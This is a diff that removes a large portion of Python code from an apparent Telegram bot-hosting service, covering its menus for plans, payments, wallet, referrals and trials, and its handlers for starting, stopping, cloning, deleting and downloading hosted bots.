-        ack(call); start_ticket_flow(call); return
-    if data.startswith("ticket_view_"):
-        ack(call); render_ticket_view(call, data.split("_", 2)[2]); return
-    if data.startswith("ticket_close_"):
-        ack(call); action_ticket_close(call, data.split("_", 2)[2]); return
-    if data.startswith("ticket_reply_"):
-        ack(call); start_ticket_reply(call, data.split("_", 2)[2]); return
-
-    # ─── wallet top-up request ────────────────────────────────
-    if data == "wallet_topup":
-        ack(call); start_wallet_topup(call); return
-    if data == "wallet_gift":
-        ack(call); start_wallet_gift(call); return
-
-    # ─── admin payment approve/reject ─────────────────────────
-    if data.startswith("payapprove_"):
-        ack(call); action_payment_approve(call, data.split("_", 1)[1]); return
-    if data.startswith("payreject_"):
-        ack(call); action_payment_reject(call, data.split("_", 1)[1]); return
-
-    # ─── unknown ──────────────────────────────────────────────
-    ack(call, "?")
-
-
-# ═════════════════════════════════════════════════════════════════
-# 18. MENU RENDERS
-# ═════════════════════════════════════════════════════════════════
-
-def render_bots_menu(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    bots = list_user_bots(uid)
-    u = db_load()["users"][str(uid)]
-    cap = (
-        f"<b>{G['diamond']} {sc('Your Bots')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Slots', f'{len(bots)} / {user_max_bots(u)}')}\n"
-    )
-    kb = types.InlineKeyboardMarkup()
-    if not bots:
-        cap += f"\n{sc('You have not deployed any bots yet')}.\n{sc('Tap upload bot to begin')}."
-    else:
-        for b in sorted(bots, key=lambda x: x.get("name", "")):
-            running = b["_id"] in RUNNING and RUNNING[b["_id"]]["proc"].poll() is None
-            mark = G["play"] if running else G["stop"]
-            kb.add(Btn(
-                f"{mark}  {sc(b['name'])[:30]}",
-                callback_data=f"bot_view_{b['_id']}"))
-    kb.add(
-        Btn(f"{G['plus']}  {sc('Upload')}",   callback_data="menu_upload", style="success"),
-        Btn(f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main", style="primary"),
-    )
-    show_menu(call.message.chat.id, PHOTOS["bots"], cap + FOOTER, kb, call=call)
-
-
-def render_upload_menu(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    u = db_load()["users"][str(uid)]
-    used = len(list_user_bots(uid))
-    cap = (
-        f"<b>{G['plus']} {sc('Upload Bot')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Plan',  PLAN_LIMITS[u['plan']]['name'])}\n"
-        f"{bullet('Slots', f'{used} / {user_max_bots(u)}')}\n"
-        f"{G['div']}\n"
-        f"<b>{sc('Send your bot file as a document')}.</b>\n"
-        f"Accepted: <code>.zip  .py  .js</code>\n"
-        f"Entry detection: <code>bot.py</code>, <code>main.py</code>, "
-        f"<code>app.py</code>, <code>index.js</code>, <code>bot.js</code>.\n"
-        f"All files are <b>encrypted at rest</b> with Fernet/AES-128 — keys live in our private key vault."
-    )
-    USER_STATES[uid] = {"flow": "await_upload"}
-    show_menu(call.message.chat.id, PHOTOS["upload"], cap + FOOTER,
-              back_main_kb(), call=call)
-
-
-def render_plans_menu(call: types.CallbackQuery) -> None:
-    lines = []
-    for v in PLAN_LIMITS.values():
-        price_txt = "Free" if v["price"] == 0 else f"{v['price']}\u09F3"
-        detail = f"{v['max_bots']} bots {G['bullet']} {v['ram']} MB RAM {G['bullet']} {price_txt}"
-        lines.append(bullet(v['name'], detail))
-    cap = (
-        f"<b>{G['star']} {sc('Plans')}</b>\n"
-        f"{G['div_eq']}\n"
-        + "\n".join(lines)
-        + f"\n{G['div']}\nTap a plan for full details.{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["plans"], cap, plans_kb(), call=call)
-
-
-def render_plan_detail(call: types.CallbackQuery, plan: str) -> None:
-    p = PLAN_LIMITS.get(plan)
-    if not p:
-        ack(call, "Unknown plan"); return
-    cap = (
-        f"<b>{G['star']} {esc(p['name'])} {sc('Plan')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Max bots',     p['max_bots'])}\n"
-        f"{bullet('RAM per bot',  '{} MB'.format(p['ram']))}\n"
-        f"{bullet('Auto-restart', 'Yes' if p['auto_restart'] else 'No')}\n"
-        f"{bullet('Duration',     'Lifetime' if plan == 'lifetime' else '{} days'.format(p['days']))}\n"
-        f"{bullet('Price',        'Free' if p['price'] == 0 else '{}$'.format(p['price']))}\n"
-        f"{G['div']}\n"
-        f"{sc('Tap buy to choose a payment method')}.{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    if plan != "free":
-        kb.add(Btn(
-            f"{G['spark']}  {sc('Buy')} {p['name']}",
-            callback_data=f"plan_buy_{plan}"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Plans')}", callback_data="menu_plans"))
-    show_menu(call.message.chat.id, PHOTOS["buy"], cap, kb, call=call)
-
-
-def render_buy_menu(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['spark']} {sc('Buy a Plan')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Pick a plan first')}.{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["buy"], cap, plans_kb(), call=call)
-
-
-def render_payment_methods_for(call: types.CallbackQuery, plan: str) -> None:
-    p = PLAN_LIMITS.get(plan)
-    if not p:
-        ack(call, "Unknown plan"); return
-    cap = (
-        f"<b>{G['wallet']} {sc('Choose Payment Method')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Plan',  p['name'])}\n"
-        f"{bullet('Price', '{}$'.format(p['price']))}\n"
-        f"{G['div']}\n"
-        f"{sc('Pick the method you will pay with')}.{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["pay"], cap, payments_kb(plan), call=call)
-
-
-def render_payment_screen(call: types.CallbackQuery, data: str) -> None:
-    # data is pay_<method> or pay_<method>_<plan>
-    parts = data.split("_")
-    method = parts[1]
-    plan = parts[2] if len(parts) >= 3 else None
-    pm = PAYMENT_METHODS.get(method)
-    if not pm:
-        ack(call, "Unknown method"); return
-    p = PLAN_LIMITS.get(plan or "")
-    cap = (
-        f"<b>{pm['tag']} {esc(pm['name'])} — {sc('Payment')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Number', pm['number'])}\n"
-        f"{bullet('Type',   pm['type'])}\n"
-    )
-    if p:
-        cap += f"{bullet('Plan', p['name'])}\n{bullet('Amount', '{}$'.format(p['price']))}\n"
-    cap += (
-        f"{G['div']}\n"
-        f"<b>{sc('How to pay')}:</b>\n"
-        f"1. {sc('Send the exact amount to the number above')}.\n"
-        f"2. {sc('Tap send proof and forward your receipt screenshot')}.\n"
-        f"3. {sc('Wait for admin approval')} ({sc('usually within 1 hour')}).\n"
-        f"{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    USER_STATES[call.from_user.id] = {
-        "flow": "await_payment_proof", "method": method, "plan": plan,
-    }
-    kb.add(Btn(
-        f"{G['plus']}  {sc('Send Proof')}", callback_data="pay_proof"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Methods')}",
-        callback_data=f"plan_buy_{plan}" if plan else "menu_buy"))
-    show_menu(call.message.chat.id, PHOTOS["pay"], cap, kb, call=call)
-
-
-def start_proof_flow(call: types.CallbackQuery) -> None:
-    st = USER_STATES.get(call.from_user.id) or {}
-    if st.get("flow") != "await_payment_proof":
-        st = {"flow": "await_payment_proof"}
-        USER_STATES[call.from_user.id] = st
-    bot.send_message(
-        call.message.chat.id,
-        f"{G['plus']} {sc('Send your payment screenshot or transaction id text now')}.\n"
-        f"{sc('Use')} /cancel {sc('to abort')}.",
-    )
-
-
-def render_profile(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    u = db_load()["users"][str(uid)]
-    p = PLAN_LIMITS.get(u["plan"], PLAN_LIMITS["free"])
-    bots = list_user_bots(uid)
-    cap = (
-        f"<b>{G['user']} {sc('Profile')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Name',     u.get('name'))}\n"
-        f"{bullet('Username', '@' + (u.get('username') or '—'))}\n"
-        f"{bullet('User ID',  uid)}\n"
-        f"{bullet('Plan',     p['name'])}\n"
-        f"{bullet('Until',    fmt_ts(u.get('plan_expires')) if u.get('plan_expires') else ('Forever' if p['price'] == 0 else '—'))}\n"
-        f"{bullet('Wallet',   '{}$'.format(u.get('wallet', 0)))}\n"
-        f"{bullet('Bots',     f'{len(bots)} / {user_max_bots(u)}')}\n"
-        f"{bullet('Joined',   fmt_ts(u.get('joined')))}\n"
-        f"{bullet('KYC',      'Verified' if u.get('kyc') else 'No')}\n"
-        f"{bullet('Referrals', u.get('ref_count', 0))}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["profile"], cap, back_main_kb(), call=call)
-
-
-def render_referral(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    u = db_load()["users"][str(uid)]
-    me = bot.get_me()
-    link = f"https://t.me/{me.username}?start={uid}"
-    cap = (
-        f"<b>{G['users']} {sc('Referral')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Your link', link)}\n"
-        f"{bullet('Referrals', u.get('ref_count', 0))}\n"
-        f"{bullet('Bonus slots', u.get('bot_slots_bonus', 0))}\n"
-        f"{G['div']}\n"
-        f"{sc('Each friend who joins via your link gives you')} +1 {sc('bot slot and')} +1\u09F3 {sc('credit')}.\n"
-        f"{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["referral"], cap, back_main_kb(), call=call)
-
-
-def render_wallet(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    u = db_load()["users"][str(uid)]
-    cap = (
-        f"<b>{G['wallet']} {sc('Wallet')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Balance', '{}$'.format(u.get('wallet', 0)))}\n"
-        f"{G['div']}\n"
-        f"{sc('Top up by sending payment proof. Admin will credit your wallet')}.\n"
-        f"{sc('You can also gift your active plan to another user')}.{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    kb.add(Btn(
-        f"{G['plus']}  {sc('Top Up')}", callback_data="wallet_topup"))
-    if u.get("plan") not in ("free",):
-        kb.add(Btn(
-            f"{G['spark']}  {sc('Gift Plan')}", callback_data="wallet_gift"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main"))
-    show_menu(call.message.chat.id, PHOTOS["wallet"], cap, kb, call=call)
-
-
-def render_help(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['rec']} {sc('Help')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Upload',  'Send a .py / .js / .zip file')}\n"
-        f"{bullet('Run',     'My Bots → pick → Start')}\n"
-        f"{bullet('Logs',    'My Bots → pick → Live Logs')}\n"
-        f"{bullet('Env',     'My Bots → pick → Env Vars')}\n"
-        f"{bullet('Plans',   'Plans → Buy Plan → method')}\n"
-        f"{bullet('Coupon',  'Coupon menu → Redeem')}\n"
-        f"{bullet('Trial',   'One-time 48h Pro trial')}\n"
-        f"{bullet('Refer',   'Earn slots by inviting friends')}\n"
-        f"{bullet('Tickets', 'Open a private support ticket')}\n"
-        f"{G['div']}\n"
-        f"Updates channel: {UPDATE_CH}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["help"], cap, back_main_kb(), call=call)
-
-
-def render_support(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['broadcast']} {sc('Support')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('DM',      SUPPORT_USR)}\n"
-        f"{bullet('Channel', UPDATE_CH)}\n"
-        f"{G['div']}\n"
-        f"{sc('Or open a ticket from the Tickets menu for tracked help')}.{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["support"], cap, back_main_kb(), call=call)
-
-
-def render_trial(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    u = db_load()["users"][str(uid)]
-    cap = (
-        f"<b>{G['eye']} {sc('Free Trial')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Get a free 48-hour Pro trial — one time per account')}.\n"
-        f"{bullet('Status', 'Already used' if u.get('trial_used') else 'Available')}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    if not u.get("trial_used"):
-        kb.add(Btn(
-            f"{G['ok']}  {sc('Claim 48h Pro Trial')}", callback_data="trial_claim"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main"))
-    show_menu(call.message.chat.id, PHOTOS["trial"], cap, kb, call=call)
-
-
-def action_trial_claim(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    d = db_load()
-    u = d["users"][str(uid)]
-    if u.get("trial_used"):
-        ack(call, "Already used"); return
-    u["trial_used"] = True
-    db_save(d)
-    grant_plan(uid, "pro", days=2)
-    audit(0, "trial_grant", f"uid={uid}")
-    ack(call, "Trial activated")
-    render_main_menu(call.message.chat.id, uid, call)
-
-
-def render_coupon(call: types.CallbackQuery) -> None:
-    cap = (
-        f"<b>{G['key']} {sc('Coupon')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Have a discount code? Tap redeem and send the code')}.{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup()
-    kb.add(Btn(
-        f"{G['plus']}  {sc('Redeem Code')}", callback_data="coupon_redeem"))
-    kb.add(Btn(
-        f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main"))
-    show_menu(call.message.chat.id, PHOTOS["coupon"], cap, kb, call=call)
-
-
-def render_user_stats(call: types.CallbackQuery) -> None:
-    uid = call.from_user.id
-    d = db_load()
-    u = d["users"][str(uid)]
-    p = PLAN_LIMITS.get(u.get("plan", "free"), PLAN_LIMITS["free"])
-    bots = list_user_bots(uid)
-    running = sum(1 for b in bots if b["_id"] in RUNNING and RUNNING[b["_id"]]["proc"].poll() is None)
-    stopped = len(bots) - running
-
-    # payments
-    pays = [x for x in d.get("payments", []) if x.get("uid") == uid and x.get("status") == "approved"]
-    last_pay = max((x.get("at", "") for x in pays), default=None)
-
-    # tickets
-    tickets = d.get("tickets", {})
-    my_tickets = [t for t in tickets.values() if t.get("uid") == uid]
-    open_tickets   = sum(1 for t in my_tickets if t.get("status") == "open")
-    closed_tickets = sum(1 for t in my_tickets if t.get("status") != "open")
-
-    # storage
-    storage_size = 0
-    for b in bots:
-        bot_dir = BASE_DIR / "storage" / "uploads" / str(b["_id"])
-        if bot_dir.exists():
-            for root, _, files in os.walk(bot_dir):
-                for f in files:
-                    try:
-                        storage_size += (Path(root) / f).stat().st_size
-                    except OSError:
-                        pass
-
-    plan_expires = u.get("plan_expires")
-    if plan_expires:
-        expires_txt = fmt_ts(plan_expires)
-    elif p["price"] == 0:
-        expires_txt = "Forever"
-    else:
-        expires_txt = "—"
-
-    cap = (
-        f"<b>{G['graph']} {sc('My Stats')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"<b>{sc('Account')}</b>\n"
-        f"{bullet('Name',       u.get('name', '—'))}\n"
-        f"{bullet('User ID',    uid)}\n"
-        f"{bullet('Joined',     fmt_ts(u.get('joined')))}\n"
-        f"{bullet('KYC',        'Verified' if u.get('kyc') else 'No')}\n"
-        f"{G['div']}\n"
-        f"<b>{sc('Plan')}</b>\n"
-        f"{bullet('Current Plan',  p['name'])}\n"
-        f"{bullet('Plan Expires',  expires_txt)}\n"
-        f"{bullet('RAM Limit',     str(p['ram']) + ' MB')}\n"
-        f"{bullet('Auto Restart',  'Yes' if p['auto_restart'] else 'No')}\n"
-        f"{G['div']}\n"
-        f"<b>{sc('Bots')}</b>\n"
-        f"{bullet('Total Bots',    len(bots))}\n"
-        f"{bullet('Running',       running)}\n"
-        f"{bullet('Stopped',       stopped)}\n"
-        f"{bullet('Slots Used',    str(len(bots)) + ' / ' + str(user_max_bots(u)))}\n"
-        f"{bullet('Storage Used',  fmt_bytes(storage_size))}\n"
-        f"{G['div']}\n"
-        f"<b>{sc('Payments')}</b>\n"
-        f"{bullet('Total Payments', len(pays))}\n"
-        f"{bullet('Last Payment',   fmt_ts(last_pay) if last_pay else '—')}\n"
-        f"{bullet('Wallet Balance', '{}$'.format(u.get('wallet', 0)))}\n"
-        f"{G['div']}\n"
-        f"<b>{sc('Other')}</b>\n"
-        f"{bullet('Referrals',     u.get('ref_count', 0))}\n"
-        f"{bullet('Bonus Slots',   u.get('bot_slots_bonus', 0))}\n"
-        f"{bullet('Free Trial',    'Used' if u.get('trial_used') else 'Available')}\n"
-        f"{bullet('Open Tickets',  open_tickets)}\n"
-        f"{bullet('Closed Tickets', closed_tickets)}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["stats"], cap, back_main_kb(), call=call)
-
-
-def start_coupon_flow(call: types.CallbackQuery) -> None:
-    USER_STATES[call.from_user.id] = {"flow": "await_coupon"}
-    bot.send_message(
-        call.message.chat.id,
-        f"{G['key']} {sc('Send your coupon code')} (Tᴇxᴛ Oɴʟʏ). /cancel {sc('to abort')}.",
-    )
-
-
-def start_wallet_topup(call: types.CallbackQuery) -> None:
-    USER_STATES[call.from_user.id] = {"flow": "await_topup_proof"}
-    bot.send_message(
-        call.message.chat.id,
-        f"{G['plus']} {sc('Send a screenshot of your top-up payment')}.\n"
-        f"{sc('Include the amount in the caption')}, e.g.  <code>200</code>.",
-        parse_mode="HTML",
-    )
-
-
-def start_wallet_gift(call: types.CallbackQuery) -> None:
-    USER_STATES[call.from_user.id] = {"flow": "await_gift_target"}
-    bot.send_message(
-        call.message.chat.id,
-        f"{G['spark']} {sc('Send the user id of the person you want to gift your plan to')}.",
-    )
-
-
-# ═════════════════════════════════════════════════════════════════
-# 19. BOT MANAGEMENT VIEWS
-# ═════════════════════════════════════════════════════════════════
-
-def render_bot_view(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    st = child_status(bot_id, b)
-    # surface the most recent crash if the bot is stopped
-    err_block = ""
-    if not st["running"]:
-        rc = b.get("last_exit_code")
-        last_err = (b.get("last_error") or "").strip()
-        if last_err or (rc not in (None, 0)):
-            head = f"{G['no']} {sc('Last error')}"
-            if rc not in (None, 0):
-                head += f"  (exit {rc})"
-            err_block = (
-                f"\n{G['div']}\n"
-                f"<b>{head}</b>\n"
-                f"<pre>{esc(last_err or '(no log captured)')[:900]}</pre>"
-            )
-    appr = (b.get("approval_status") or "").lower()
-    if appr == "pending":
-        status_lbl = "Pending approval"
-    elif appr == "rejected":
-        status_lbl = "Rejected"
-    elif st["running"]:
-        status_lbl = "Running"
-    elif b.get("status") == "crashed":
-        status_lbl = "Crashed"
-    else:
-        status_lbl = "Stopped"
-    cap = (
-        f"<b>{G['diamond']} {esc(b['name'])}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Status',  status_lbl)}\n"
-        f"{bullet('Kind',    st['kind'] or '—')}\n"
-        f"{bullet('PID',     '••••' if st['pid'] else '—')}\n"
-        f"{bullet('Uptime',  fmt_dur(st['uptimeMs']))}\n"
-        f"{bullet('Size',    fmt_bytes(st['sizeBytes']))}\n"
-        f"{bullet('CPU',     '{:.1f}%'.format(st['cpuPct']))}\n"
-        f"{bullet('Memory',  fmt_bytes(st['memBytes']))}\n"
-        f"{bullet('Created', fmt_ts(b.get('created')))}"
-        f"{err_block}\n"
-        f"{G['div']}{FOOTER}"
-    )
-    owner_doc = db_load()["users"].get(str(b["owner"])) or {}
-    is_premium = owner_doc.get("plan", "free") != "free" and user_plan_active(owner_doc)
-    # Surface the active tunnel URL in the caption when one is open
-    tun = TUNNELS.get(bot_id)
-    if tun and tun.get("proc") and tun["proc"].poll() is None and tun.get("url"):
-        cap = (
-            cap[: -len(FOOTER)]
-            + f"\n{G['div']}\n"
-            + f"{bullet('Public URL', tun['url'])}\n"
-            + f"{bullet('Port',       tun.get('port', '—'))}"
-            + FOOTER
-        )
-    show_menu(call.message.chat.id, PHOTOS["bot"], cap,
-              bot_actions_kb(bot_id, st["running"], premium=is_premium), call=call)
-
-
-def action_bot_start(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    loading(call, "Starting bot")
-    res = start_child(b)
-    ack(call, "Started" if res["ok"] else f"Err: {res.get('error')}")
-    render_bot_view(call, bot_id)
-
-
-def action_bot_stop(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    loading(call, "Stopping bot")
-    stop_child(bot_id, manual=True)
-    ack(call, "Stopped")
-    render_bot_view(call, bot_id)
-
-
-def action_bot_restart(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    loading(call, "Restarting bot")
-    res = restart_child(b)
-    ack(call, "Restarted" if res["ok"] else f"Err: {res.get('error')}")
-    render_bot_view(call, bot_id)
-
-
-def action_bot_logs(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    info = RUNNING.get(bot_id)
-    log = info["log"] if info else []
-    last = log[-MAX_LOG_SEND:] if log else [f"({sc('no logs yet')})"]
-    txt = (
-        f"<b>{G['bolt']} {sc('Live Logs')} — {esc(b['name'])}</b>\n"
-        f"{G['div_eq']}\n<pre>"
-        + esc("\n".join(last))[:3500]
-        + f"</pre>\n{G['div']}{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        Btn(
-            f"{G['refresh']}  {sc('Refresh Logs')}",
-            callback_data=f"bot_logs_{bot_id}",
-        ),
-        Btn(
-            f"{G['back']}  {sc('Back')}",
-            callback_data=f"bot_view_{bot_id}",
-        ),
-    )
-    show_text(call.message.chat.id, txt, kb, call=call)
-
-
-def action_bot_info(call: types.CallbackQuery, bot_id: str) -> None:
-    render_bot_view(call, bot_id)
-
-
-def render_bot_delete_confirm(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    cap = (
-        f"<b>{G['no']} {sc('Delete Bot')}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{bullet('Bot', b['name'])}\n\n"
-        f"{G['warn']}  <b>{sc('Choose delete type')}:</b>\n\n"
-        f"{G['bullet']} <b>{sc('Delete Bot Files')}</b> — {sc('removes files and keys only')}\n"
-        f"{G['bullet']} <b>{sc('Delete All Data')}</b> — {sc('removes files keys AND GitHub backup')}\n\n"
-        f"{sc('This cannot be undone')}.{FOOTER}"
-    )
-    kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        Btn(
-            f"{G['trash']}  {sc('Delete Bot Files')}",
-            callback_data=f"bot_delfiles_{bot_id}"),
-        Btn(
-            f"{G['no']}  {sc('Delete All Data')}",
-            callback_data=f"bot_delall_{bot_id}"),
-        Btn(
-            f"{G['back']}  {sc('Cancel')}",
-            callback_data=f"bot_view_{bot_id}"),
-    )
-    show_menu(call.message.chat.id, PHOTOS["bot"], cap, kb, call=call)
-
-
-def render_bot_delfiles_confirm(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    cap = (
-        f"<b>{G['trash']} {sc('Delete Bot Files')} — {esc(b['name'])}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Removes encrypted files and keys only.')}\n"
-        f"{sc('GitHub backup will NOT be deleted.')}\n\n"
-        f"{sc('Are you sure?')}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["bot"], cap,
-              confirm_kb(f"bot_delfilesyes_{bot_id}", f"bot_view_{bot_id}", "Yes Delete", "Cancel"),
-              call=call)
-
-
-def render_bot_delall_confirm(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    cap = (
-        f"<b>{G['no']} {sc('Delete All Data')} — {esc(b['name'])}</b>\n"
-        f"{G['div_eq']}\n"
-        f"{sc('Removes files, keys AND deletes from GitHub.')}\n"
-        f"{G['warn']} <b>{sc('Everything will be permanently gone.')}</b>\n\n"
-        f"{sc('Are you sure?')}{FOOTER}"
-    )
-    show_menu(call.message.chat.id, PHOTOS["bot"], cap,
-              confirm_kb(f"bot_delalyes_{bot_id}", f"bot_view_{bot_id}", "Yes Delete All", "Cancel"),
-              call=call)
-
-
-def action_bot_delete(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    loading(call, "Deleting bot")
-    stop_child(bot_id, manual=True)
-    for f in b.get("enc_files") or []:
-        try:
-            Path(f["enc_path"]).unlink(missing_ok=True)
-        except Exception:
-            pass
-        KEYRING.remove(f["key_id"])
-    rmrf(b.get("dir") or "")
-    delete_bot_doc(bot_id)
-    ack(call, "Deleted")
-    audit(call.from_user.id, "bot_delete", f"bot={bot_id}")
-    render_bots_menu(call)
-
-
-def action_bot_delfiles(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    loading(call, "Deleting bot files")
-    stop_child(bot_id, manual=True)
-    for f in b.get("enc_files") or []:
-        try:
-            Path(f["enc_path"]).unlink(missing_ok=True)
-        except Exception:
-            pass
-        KEYRING.remove(f["key_id"])
-    rmrf(b.get("dir") or "")
-    delete_bot_doc(bot_id)
-    ack(call, "Bot files deleted")
-    audit(call.from_user.id, "bot_delfiles", f"bot={bot_id}")
-    render_bots_menu(call)
-
-
-def action_bot_delall(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    loading(call, "Deleting all data")
-    stop_child(bot_id, manual=True)
-    for f in b.get("enc_files") or []:
-        try:
-            Path(f["enc_path"]).unlink(missing_ok=True)
-        except Exception:
-            pass
-        KEYRING.remove(f["key_id"])
-    rmrf(b.get("dir") or "")
-    threading.Thread(target=_gh_delete_bot_files, args=(b,), daemon=True).start()
-    delete_bot_doc(bot_id)
-    ack(call, "All data deleted")
-    audit(call.from_user.id, "bot_delall", f"bot={bot_id}")
-    render_bots_menu(call)
-
-
-def action_bot_clone(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    u = db_load()["users"][str(call.from_user.id)]
-    if len(list_user_bots(call.from_user.id)) >= user_max_bots(u):
-        ack(call, "Slot limit reached"); return
-    loading(call, "Cloning bot")
-    new_id = secrets.token_hex(8)
-    new_dir = DIRS["sandbox"] / f"{call.from_user.id}_{new_id}"
-    new_dir.mkdir(parents=True, exist_ok=True)
-    new_doc = {
-        "_id": new_id, "owner": call.from_user.id,
-        "name": f"{b['name']}_clone",
-        "dir": str(new_dir), "created": ts_iso(),
-        "enc_files": [], "env": dict(b.get("env") or {}), "status": "stopped",
-    }
-    for f in b.get("enc_files") or []:
-        key = KEYRING.fetch(f["key_id"])
-        if not key:
-            continue
-        try:
-            plain = read_encrypted(Path(f["enc_path"]), key)
-        except InvalidToken:
-            continue
-        kid, k2, cipher = encrypt_file(plain)
-        rel = f"{call.from_user.id}/{int(time.time())}_{safe_name(f['filename'])}.enc"
-        out = DIRS["encfiles"] / rel
-        out.parent.mkdir(parents=True, exist_ok=True)
-        out.write_bytes(cipher)
-        meta = dict(f); meta.update({"clone_of": b["_id"], "stored_at": str(out)})
-        KEYRING.store(kid, k2, meta)
-        new_doc["enc_files"].append({
-            "key_id": kid, "enc_path": str(out),
-            "filename": f["filename"], "rel_path": f.get("rel_path") or f["filename"],
-        })
-    save_bot(new_doc)
-    audit(call.from_user.id, "bot_clone", f"src={bot_id} dst={new_id}")
-    ack(call, "Cloned")
-    render_bots_menu(call)
-
-
-def action_bot_download(call: types.CallbackQuery, bot_id: str) -> None:
-    b = find_bot(bot_id)
-    if not b:
-        ack(call, "Not found"); return
-    if b["owner"] != call.from_user.id and not is_admin(call.from_user.id):
-        ack(call, "Not yours"); return
-    files = b.get("enc_files") or []
-    if not files:
-        ack(call, "No files"); return
-    loading(call, "Preparing download")
-    out = Path(tempfile.gettempdir()) / f"dl_{b['_id']}.zip"
-    try:
-        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
-            for f in files:
-                key = KEYRING.fetch(f["key_id"])
-                if not key:
-                    continue
-                try:
-                    plain = read_encrypted(Path(f["enc_path"]), key)
-                except Exception:
-                    continue
-                z.writestr(f.get("rel_path") or f["filename"], plain)
-        with open(out, "rb") as fh:
-            bot.send_document(
-                call.message.chat.id, fh,
-                caption=f"{G['download']} {sc('Bot files')} — {esc(b['name'])}",
-                visible_file_name=f"{safe_name(b['name'])}.zip",
-            )
